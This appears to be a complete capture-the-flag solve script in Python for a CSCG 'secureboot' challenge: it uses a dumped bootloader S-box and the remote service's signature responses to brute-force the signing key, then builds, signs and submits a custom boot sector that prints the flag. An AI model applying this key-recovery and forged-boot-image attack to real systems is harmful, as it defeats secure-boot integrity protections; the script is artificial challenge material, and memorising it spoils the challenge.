from os import fdopen
from socket import timeout
from pwn import *
import tempfile, subprocess

def escape_ansi(line):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    r =  ansi_escape.sub('', line)
    r = r.replace('\x1b(B', "")
    return r

with open("../pwn/dumped_bootloader", "rb") as f:
    sbox = bytearray(f.read()[:256])
all = []
key = bytes.fromhex("4100410041004100")
offset = sbox.index(key)


def encrypt(text, key, sbox):
    v = text[:]
    t = v[0]
    for i in range(32 * 8):
        t = (t + key[i & 0b111]) & 0xFF
        t = (sbox[t] + v[(i + 1) & 0b111]) & 0xFF
        t = ((t << 1) | (t >> 7)) & 0xFF
        v[(i + 1) & 0b111] = t
    return v


def hash(data, sbox):
    text = [0] * 8
    keys = [data[i * 8:][:8] for i in range(len(data) // 8)]
    keys[-1] += bytes([0] * (8 - len(keys[-1])))
    for k in keys:
        enc = encrypt(text, k, sbox)
        text = [a ^ b for a, b in zip(text, enc)]
    return text


def sign(data, key, sbox):
    signature = hash(data, sbox)
    return encrypt(signature, key, sbox)


def brute_force(byte):
    with open(f"res/{byte}.bin", "rb") as f:
        my_input = f.read()

    print(f"Brute forcing key byte {byte} online")
    #r = remote('localhost', 1024)
    r = process("ncat --ssl 7b000000e673f71e54ffcf64-secureboot.challenge.master.cscg.live 31337", shell=True)
    assert len(my_input) == 512

    
    r.sendlineafter(b"[1] PRODUCTION", b"1")
    r.sendlineafter(b"[1] NOGRAPHIC", b"0")

    r.sendlineafter(b"[*] End your input with \"EOF\"",((bytes(my_input)+bytes([0]*8)).hex()+"EOF").encode())

    r.recvuntil(b"Invalid signature!")
    data = r.recvall(timeout=1)
    signature = data.partition(b'\x1b[10d')[-1].partition(b'\x1b')[0].decode()
    r.close()
    valid = bytes.fromhex(signature)
    
    sbox[offset : offset + 8] = [0] * 8
    while bytes(hash(my_input, sbox)) != valid:
        sbox[offset + byte] += 1
        print(f"{100*sbox[offset+byte]/256:.02f}%", end="\r")

    print(f"key byte {byte}: {hex(sbox[offset+byte])}")
    return sbox[offset + byte]

leaked_key = []
for i in range(8):
    leaked_key.append(brute_force(i))
print(f"key: {bytes(leaked_key).hex()}")

print("signing custom mbr..")


asm = '''
.intel_syntax noprefix
.code16
.section .text
.global _start
_start:
    //read flag
    mov ax, 0x0201
    mov bx, 0x600
    mov dl, 0x82
    mov cx, 0x0001
    mov dh, 0
    int 0x13

    mov si, 0x600
    mov ah, 0x0e
print_loop:
    lodsb
    cmp al, 0x00
    je wait
    int 0x10
    jmp print_loop
wait:
    xor ax, ax
    int 0x16
shutdown:
    mov ax, 0x5307
    mov bx, 0x01
    mov cx, 0x03
    int 0x15
loop:
    hlt
    jmp loop
'''

fd, path = tempfile.mkstemp(suffix =".S")
fd1, path1 = tempfile.mkstemp()
with fdopen(fd, "w") as f:
    f.write(asm)

cmd = f'clang {path} -nostdlib -target i386-none-elf -static -Ttext 0x7c00 -o {path} && objcopy --only-section=.text --output-target binary {path} {path1}'

subprocess.check_output(["sh", "-c", cmd])
with fdopen(fd1, "rb") as f:
    data = f.read()
data = data.ljust(512, b"\xcc")

sbox[offset : offset + 8] = leaked_key
signature = bytes(sign(data, leaked_key, sbox))

r = process("ncat --ssl 7b000000e673f71e54ffcf64-secureboot.challenge.master.cscg.live 31337", shell=True)
#r = remote('localhost', 1024)

r.sendlineafter(b"[1] PRODUCTION", b"1")
r.sendlineafter(b"[1] NOGRAPHIC", b"0")

r.sendlineafter(b"[*] End your input with \"EOF\"",((data+signature).hex()+"EOF").encode())

data = escape_ansi(r.recvall(timeout=1).decode())
flag = data.split("CSCG")[1]
print("FLAG:","CSCG"+flag)
